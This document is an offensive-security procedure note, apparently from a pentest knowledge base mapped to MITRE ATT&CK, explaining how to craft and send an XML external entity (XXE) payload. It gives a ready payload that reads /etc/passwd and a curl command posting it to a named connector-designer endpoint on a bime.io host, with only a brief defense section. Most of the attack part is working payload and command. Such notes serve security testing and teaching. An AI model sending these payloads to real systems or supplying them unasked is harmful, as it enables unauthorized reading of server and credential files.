---
tags:
  - xxe
  - exploitation
type: procedure
tools:
  - '[[tools/Curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/xxe-payload-test]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: ceb0d3a0-a0f3-48ba-a0c6-7b40ccdeb3de
created_at: '2025-12-13T09:00:27.598Z'
updated_at: '2025-12-13T09:00:27.598Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft and Send XXE Payload

## Summary

This procedure details crafting and delivering an XXE payload to exploit improper XML entity handling in applications like Bime's Connector Designer, enabling arbitrary file reads.

## Description

XXE vulnerabilities occur when XML parsers expand external entities, allowing file system access. This targets the root cause of improper handling, as inferred from the Bime report, to disclose server files.

## Requirements
1. Identified vulnerable XML endpoint
2. HTTP client for sending payloads
3. Knowledge of target file paths (e.g., /etc/passwd)

## Defense

Defensive measures and detection strategies:
- Disable external entity resolution in XML parsers (e.g., via libxml2 settings)
- Use WAF rules to block DOCTYPE declarations in XML

## Objectives
1. Trigger entity expansion
2. Read arbitrary server files
3. Confirm information disclosure

## Instructions

### Step 1: Craft Payload

**Context**: Build XML with external entity referencing a local file.

Create the payload manually or via script.

> Example: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

### Step 2: Send Payload

**Context**: Transmit the payload to the endpoint.

Execute [[commands/xxe-payload-test]]:

```bash
curl -X POST https://target.bime.io/connector-designer -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

> This attempts to read /etc/passwd; adjust the file path as needed.

## MITRE ATT&CK Mapping

### Tactics
- [[Execution]]

### Techniques
- [[Exploit Public-Facing Application]]

### Sub-Techniques

## Commands Used
- [[commands/xxe-payload-test]]

## Tools Used
- [[tools/Curl]]

## Tags
- [[xxe]]
- [[exploitation]]
